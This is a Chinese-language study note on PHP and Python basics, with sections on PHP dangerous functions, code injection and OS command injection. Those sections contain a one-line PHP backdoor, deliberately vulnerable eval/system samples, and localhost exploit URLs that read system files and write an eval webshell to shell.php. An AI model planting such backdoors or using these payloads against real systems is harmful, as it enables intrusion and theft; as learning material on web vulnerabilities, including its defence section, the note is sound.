# PHP

## 变量

> 变量定义和使用

```php
<?php
    //1.标识符定义（定义超多特殊字符时候使用，大部分特殊字符无需转义）
    $name1=<<<end 
    <h1>hehe</h1>
    end;

//2.直接定义
#name2="hehe";
    
//执行
echo $name1;

//格式化输出
echo "<pre>".$name1;
    ?>
```

> 可变变量

可变变量是指一个变量的名字可以动态的设置和使用。`$$` 是php特性，也是php产生变量覆盖漏洞的原因之一。

```php
$name="jack";
$jack="nihao";

echo $$name;  //输出 nihao   原因:$$name ==$($name) --->$(jack)
```

```php
$name="jack";
$jack="nihao";
$$name=="haha";

echo $jack;  //输出 haha  原因:$$name ==$($name) --->$(jack)
```

## 常量

变量用\$,常量用大写字母，且常量后续不能改变

```php
define("NAME","jack");
echo NAME; //输出jack
```

> 预定义常量

![image-20240321203847232](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240321203847232.png)

## 符号

```php
` `  //反引号，自动适配并调用系统命令 echo `whoami`; 

@  //屏蔽表达式可能出现的错误   echo @$name;
```



## 函数

```php
unset()  //释放指定的变量  unset($name1);

var_dump() //输出变量的数据类型  var_dump($name1) 

exit; //结束整个php脚本的执行，可以exit(""); 同die() 语句；

mysqli_connect() //连接数据库 $db_link=mysqli_connect($db_host,$db_user,$db_pwd,$db_name)
mysqli_query() //执行sql  mysqli_query($db_link,$sql);
mysqli_close()  //关闭连接 mysqli_close($db_link)  
    
stristr() //判断是否包含字符串;  stristr(A,B)  判断A是否包含在B中
php_uname()  //判断操作系统类型
```





## 动态函数

```php
function a(){
    echo "A";
};

function b(){
    echo "B";
};

//动态函数
$func_name=$_GET['func_name']; //当浏览器使用GET请求时：http://locathost/test.php?func_name=a
$func_name();   //调用
```

所以，可以动态调用函数，包括已存在的函数，如phpinfo();

---

```php
//最简单的后门  xx(xx);
$_GET['a']($_GET['b']);
    
//http://locathost/test.php?a=assert&b=phpinfo()   ==>assert(phpinfo());
//http://locathost/test.php?a=system&b=ipconfig    ==>system(ipconfig);
```



## 数据库交互

![image-20240322142930805](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240322142930805.png)

> 链接数据库

```php
$db_host="127.0.0.1";
$db_user="root";
$db_pwd="123456";
$db_name="db";

$db_link=mysqli_connect($db_host,$db_user,$db_pwd,$db_name); //true 
```

> 执行SQL

```php
$sql="elect * from user;";
mysqli_query($db_link,$sql);
```



## 危险函数和语句

| 函数或语句         | 作用                                                         | 示例                                                         |
| ------------------ | :----------------------------------------------------------- | :----------------------------------------------------------- |
| eval（ ）          | 执行符合php规范的php字符串，可以一次执行多句                 | \$code="ipconfig";<br/>eval($code);                          |
| assert（ ）        | 执行符合php规范的php文本，每次只能执行一句，<br/>但其为函数可以动态调用，危险性高,故PHP8.0版本删除 | \$code="ipconfig";<br/>assert($code);                        |
| preg_replace ( )   | 字符替换。'~\\[.*\\]~' 是匹配条件,'A'是替换，[he] 是字符串<br>e是以php执行匹配到的字符串，\\\1是取符合匹配条件的第一个 | \$code=preg_replace('~\\[.\*\\]~','A','[he]') ; <br> $code=preg_replace('~\\[.*\\]~e','\\\1','[he]') ; |
| call_user_func ( ) | 回调函数，一个函数调用另一个函数。 func1调用func2            | call_user_func(\$func1,$func2);                              |
| array_map ( )      | 回调函数。                                                   |                                                              |
| system ( )         | 命令执行函数。可以将字符串作为OS命令执行，<br>1.使用时PHP自动区分平台;<br>2.自带输出功能，输出全部 | \$cmd="cmd";<br>system($cmd);                                |
| exec ( )           | 命令执行函数。1.需要输出执行结果，如echo exec()；<br>2.只能显示执行结果的最后一行 | \$cmd="cmd";<br/>echo exec($cmd);                            |
| shell_exec ( )     | 命令执行函数。 1.需要输出执行结果                            | \$cmd="cmd";<br/>echo shell_exec ($cmd);                     |
| passthru ( )       | 命令执行函数。 1.自带输出功能                                | \$cmd="cmd";<br/>passthru ($cmd);                            |
| popen ( )          | 命令执行函数。1.返回一个文件指针(可以理解为文件名);<br>2.读取时要传入文件指针和读取的字节数 | \$cmd="cmd";<br/>\$result=popen ($cmd,r);<br>echo fread(\$result,1024); |
| 反引号             | 反引号内的字符串，会被解析成OS命令                           | echo \`cmd`;                                                 |



## PHP代码注入

传入PHP代码执行函数的变量，如果没有做严格的过滤，那么攻击者可以随意注入想要执行的代码并执行；如果执行成功，就认为存在PHP代码注入漏洞，也就是RCE。

> 漏洞代码

```php
$code=$_REQUEST['code'];
eval($code);
```

> 漏洞利用

1、可以通过shell直接用蚁剑连接

```txt
shell: http://localhost/php/eval.php
pass: code
```

2、获取当前文件绝对路径

```http
http://localhost/php/eval.php?code=print(_FILE_)
```

3.读文件

```http
http://localhost/php/eval.php?code=print(file_get_contents('eval.php'))
http://localhost/php/eval.php?code=print(file_get_contents('c:/windows/system32/drivers/hosts'))
```

4.写文件

```http
http://localhost/php/eval.php?code=file_put_contents('hh.php','<?php phpinfo();?>')
```



## OS命令注入

应用在调用函数执行系统命令时吗，如果将用户的输入作为系统命令的参数拼接到命令行中，会造成命令执行漏洞；

> 漏洞代码

```php
$shell=$_REQUEST['cmd'];
system($shell);
```

> 漏洞利用

1.读系统文件

```http
http://localhost/php/eval.php?cmd=type c:/windows/system32/drivers/hosts
http://localhost/php/eval.php?cmd=cd /etc/passwd
```

2.写文件

```http
http://localhost/php/eval.php?cmd=echo ^<^?php @eval($_REQUEST['dong'])^?^> >shell.php
```

3.执行某程序（计算器）

```http
http://localhost/php/eval.php?cmd=c:\windows\system32\calc.exe
```

4.反弹shell

```txt
```

---

## 漏洞防御

- 尽量不要使用eval等危险语句和函数，如果一定要使用，需要严格过滤；
- preg_replace 函数要放弃使用参数e；
- 在php.ini配置文件中禁用危险函数

```sh
disbale_function=system,assert
```

- 参数的指尽量使用引号包裹，在拼接前使用addslashes函数进行转义

---





# Python

https://code.visualstudio.com

---

【】 列表  （）元组   { }字典；元组不可变，字典键值对

 ```py
 range(1,101) ==>1到100的区间
 for i in range(1,101)
 ```

## 常用函数

```py
print()函数：打印字符串;
raw_input()函数：从用户键盘捕获字符;
len()函数：计算字符长度;
format()函数：实现格式化输出;
type()函数：查询对象的类型;
int()函数、float()函数、str()函数等：类型的转化函数;
id()函数：获取对象的内存地址;
help()函数：Python的帮助函数;
s.islower()函数：判断字符小写;
s.sppace()函数：判断是否为空格;
str.replace()函数：替换字符;
import()函数：引进库;
math.sin()函数：sin()函数;
math.pow()函数：计算次方函数;
os.getcwd()函数：获取当前工作目录;
listdir()函数：显示当前目录下的文件;
time.sleep()函数：停止一段时间;
random.randint()函数：产生随机数;
range()函数：返回一个列表，打印从1到100;
```



## 文件函数

```py
f = open('PATH')                        打开指定路径的文件f 是文件对象。

f.read()                                从文件对象中读取文件内容

f.readline()                            读取一行内容

f.readlines()                           返回一个列表，元素是文件的每一行内容

f.write()                               向文件中写入内容

f.writelines()                          以列表的方式向文件中写入内容。

f.close()                               关闭文件

time.sleep()                            沉睡响应的秒数
```

## 文件写入

> 文件写入-write

```py
f= open("./pass.dic", "w")
f.write("123456")
```

write() 把含有文本数据或二进制数据块的字符串写入到文件中去。

写入文件时，不会自动添加行结束标志，需要程序员手工输入。

> 文件写入-writelines

```py
f = open("./pass.dic", "a")
pass_list=['password\n','123456\n','123qwe\n']
f.writelines(pass_list)
f.close()
```

writelines() 方法是针对列表的操作，它接受一个字符串列表作为参数，将它们写入文件，行结束符并不会被自动加入，所以如果需要的话，必须在调用writelines() 前给每行结尾加上行结束符。



## 文件读取

> 文件读取-read

```py
f = open("./pass.dic",'r')
f.read() 
```

read() 方法有点莽，读取文件中所有内容，此方法慎用。

read() 方法比较适合读取二进制文件，包括exe 程序，图片等文件，不适合读取纯文本文件。

> 文件读取-readline

```py
f = open("./pass.dic",'r')
f.readline()
```

读取打开文件的一行，读取下个行结束符之前的所有字节，包括行结束符，作为字符串返回。该函数每执行一次，向下读取一行。

> 文件读取-readlines

```py
f.readlines()
```

读取所有剩余的行然后把它们作为一个元素是字符串的列表返回。(也是读取所有，慎用)

>文件迭代-for

如果需要逐行处理文件，可以结合for 循环迭代（遍历）文件。迭代文件的方法与处理其他序列类型的数据类似。

```py
path = "./pass.dic"
f = open(path, "r")
for i in f:
	print(i.strip())
    
f.close()
```

最优方法 

```py
path="./text.dic"

with open(file=path,mode="r") as f:
    for line in f:
        print(line.strip())
```

with语句是用来简化代码的，将打开文件的操作放在with'语句中，代码块结束后，文件将自动关闭；

---



## 异常

try  except finally





## 内网主机存活检测程序

